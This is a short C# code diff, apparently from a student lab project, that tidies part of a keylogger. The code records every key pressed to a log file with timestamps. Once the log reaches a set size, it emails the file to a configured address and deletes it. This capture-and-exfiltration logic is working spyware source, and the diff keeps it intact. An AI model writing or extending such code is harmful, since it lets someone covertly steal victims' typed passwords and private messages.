@@ -19,7 +19,6 @@ namespace WebCam
             using (var streamWriter = new StreamWriter(KeyboardLog, true))
             {
                 streamWriter.WriteLine("[" + DateTime.Now + "]: Key[" + keyName + "]");
-                streamWriter.Dispose();
             }
             CheckSize(KeyboardLog);
         }
@@ -35,13 +34,10 @@ namespace WebCam
 
         private void CheckSize(string filePath)
         {
-            if (new FileInfo(filePath).Length > _config.FileSize)
+            if (new FileInfo(filePath).Length > _config.FileSize && !string.IsNullOrEmpty(_config.Email))
             {
-                if (!string.IsNullOrEmpty(_config.Email))
-                {
-                    new EmailManager().SendEmail(_config.Email, "Laba 8 Log", filePath);
-                    new FileInfo(filePath).Delete();
-                }
+                new EmailManager().SendEmail(_config.Email, "Laba 8 Log", filePath);
+                new FileInfo(filePath).Delete();
             }
         }
     }
